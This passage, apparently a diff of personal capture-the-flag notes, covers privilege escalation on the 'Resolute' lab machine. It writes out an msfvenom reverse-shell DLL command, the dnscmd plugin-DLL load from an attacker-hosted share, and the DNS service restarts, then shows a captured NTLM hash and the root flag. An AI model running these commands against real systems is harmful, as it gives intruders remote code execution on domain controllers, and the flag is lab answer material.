@@ -80,6 +80,31 @@ I think we have to host the fill remotely or i am doing something
 impacket-smbserver Toolkit $(pwd)
 ```
 
+
+I tried a little different approach
 ```
 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=443 -f dll -o rev.dll
+
+dnscmd.exe /config /serverlevelplugindll \\10.10.16.20\s\rev.dll
+
+sc.exe \\resolute stop dns
+
+sc.exe \\resolute start dns
 ```
+Finally the file got accessed
+![[Pasted image 20240507021840.png]]
+```
+RESOLUTE$::MEGABANK:4141414141414141:8db21665b118662df7b25a4396e9f85b:01010000000000000097e678f69fda01e0edad4d662e541b00000000010010006b0073004800700063006b0078006e00020010004e004e006a004a007100770050006f00030010006b0073004800700063006b0078006e00040010004e004e006a004a007100770050006f00070008000097e678f69fda0106000400020000000800300030000000000000000000000000400000668a0f9246c0afc5a27f72e7cf27723576a048643bf4c107eb1ab22382fa19590a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320030000000000000000000
+```
+
+I also learned a different approach to initiate the netcat listener
+![[Pasted image 20240507021928.png]]
+
+
+
+```
+more root.txt
+1eb2ecc11683dca09ddcf26e350bc27e
+```
+![[Pasted image 20240507022044.png]]
